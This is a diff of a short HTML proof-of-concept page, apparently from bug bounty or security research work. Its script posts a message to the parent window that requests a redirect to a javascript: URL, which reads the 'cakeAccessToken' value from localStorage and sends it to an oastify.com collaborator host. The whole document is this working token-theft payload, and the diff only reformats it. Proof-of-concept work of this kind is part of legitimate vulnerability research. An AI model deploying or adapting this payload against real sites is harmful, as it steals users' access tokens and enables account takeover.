@@ -3,7 +3,16 @@
 <head><title>PoC</title></head>
 <body>
 <script>
-window.parent.postMessage(JSON.stringify({action:"navigate",payload:{type:"redirect",param:"javascript:fetch('s4xv7ata3amc9zxc12o1zvsxvo1fp7dw.oastify.com/?t='+localStorage.getItem('cakeAccessToken'))"}}),"*")
+  window.parent.postMessage(
+  JSON.stringify({
+    action: "navigate",
+    payload: {
+      type: "redirect",
+      param: "javascript:fetch('https://zjmrr4ab6g20ipsmwayf33677ydp1ip7.oastify.com/?t='+localStorage.getItem('cakeAccessToken'))"
+    }
+  }),
+  "*"
+);
 </script>
 </body>
 </html>
